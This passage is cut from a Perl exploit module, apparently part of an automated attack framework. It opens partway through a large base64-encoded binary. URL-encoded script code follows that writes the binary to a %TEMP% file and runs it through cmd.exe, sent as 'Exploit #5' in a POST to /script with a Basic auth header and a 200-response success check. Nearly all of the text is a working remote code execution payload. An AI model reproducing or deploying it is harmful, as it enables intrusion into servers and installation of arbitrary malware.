JVW5vRGxRQUFJdndablQyZEp4M0NCaEJBSTJOU1AvLy8xQm85TkpBQUdwNFJ1aTFhMmdBMEwvV2pZVkkvLy8vVWxEWjdnSUFBRnpFR0tDbTJBQUFpL0NoV0FKQkFJdjZpVFdnQzBFQWhjQ0pQWVVMUVFDSnlzQUxRZFdKUGE0TFFRQjBHNWxxRm1oaVFnOEFVbEROc3BrQUFDZkdKZGVKUmV5SmxmRDNEZ05GN1AvLy8vL0hSZkQvLy85L2FHQWd3UUJUL3hWZ3dleEFEQmpRUUY0TTN2VXo5b1hBeGpFei85SU5zQXRCUzRtMER4Y0lBQURlRmJBTFFRQ05CQmRRNklBY0FLYWhHRUZBNEwvRVZFYUJ0YklJQUFBNzhIelJpMk0xMEVBQWpWVUVpVTM4aTl2ejBMS1hPVVg4VW9zVktOQkFBRkNoK0JkQkFGRlNVT2lEVmdBb2hjQjBEaUwrNk5KQTllZ1VqZ0FBZzhRYmkwZjhoY0IxRFdqVTB1QnU2QkQ3Ly85UHhBU0xSZnlVUmZRQVVra0FoY0Fmamw4QkFBREhSZmdBQUFBQWkwMzRpMFhvaTNRQkVJdE9DSVhKRDRRb0x3QUFPdDNhWm90Y0FncjJ3eU82eUZibzNBMEFBSVBFay9iRFVBK0ZEUUFBM2ZiREJBK0VzWW9BQUlOK0NBRVBoWjRBQUFDaC9CZEJBSXRPQkZCUjZJNUxBT2lMRFFnWFFRQ2xFd1NMK0kybXdGQlJ4NlRFQVFBQUFJbFZ6RjVhUlFBQVpwYi93RUtMVmdSU1hURkwvQUNMSGNUTVFRQ2h1QUpCblVHTEhNYUQrUXFKSGNRR1FRQ2p1QUpCQUg0bWl4WEl3SGdBYUxBdFFMK0R3a0JTL3hXQXdaMEFEMTQ3VUdpWTBrQUE2QjhaQUxXRFFFSmNSZ2dBQUFBQTYyUEhSbUhOQUFjQTlCV29Bc0VBUW9rVnFBS0tBRmJvV1JVQTFyckVCSU4rQ0FOMVNZdE9CTGdCQUFBQWlZallab2xGM0tINEYvOEFrMVhVdGxDL1RlQ0pudVRvVEVNQW0rczJpejBmQW0wQStSWE1wa0dlUjBLSlBkRUNRUUJQRlNZQ1FRQlc4d2thQUFDRGx5ZUxSZlNMVmZpTFRmeEFnOElVTzhHSlI%2bPiVURU1QJVx1REpneC5iNjQ%3d%22%29%3b%0aString%20%5b%5d%20SuwuC%20%3d%20new%20String%5b3%5d%3b%0aSuwuC%5b0%5d%20%3d%20%22cmd.exe%22%3b%0aSuwuC%5b1%5d%20%3d%20%22/c%22%3b%0aSuwuC%5b2%5d%20%3d%20new%20String%28zClQs%2c%20%22UTF-8%22%29%3b%0aRuntime.getRuntime%28%29.exec%28SuwuC%29%3b%0a&Submit=Run',
                        TEXT         => 'Sending Exploit #5 Request : [POST] /script',
                        HEADERS      => {
                           'Authorization' => 'Basic X19VU0VSTkFNRV9fOg==',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
